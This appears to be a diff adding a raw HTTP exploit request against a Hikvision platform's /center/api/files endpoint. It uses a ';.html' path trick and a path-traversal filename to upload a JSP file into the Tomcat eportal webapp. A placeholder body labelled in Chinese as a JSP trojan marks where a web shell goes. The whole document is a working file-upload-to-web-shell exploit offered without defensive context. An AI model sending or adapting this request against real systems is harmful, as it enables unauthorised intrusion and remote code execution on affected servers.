@@ -1,0 +1,10 @@
+POST /center/api/files;.html HTTP/1.1
+Host: 10.10.10.10
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a--
+
+----WebKitFormBoundary9PggsiM755PLa54a
+Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
+Content-Type: application/zip
+
+<%jsp 的马%>
+------WebKitFormBoundary9PggsiM755PLa54a--
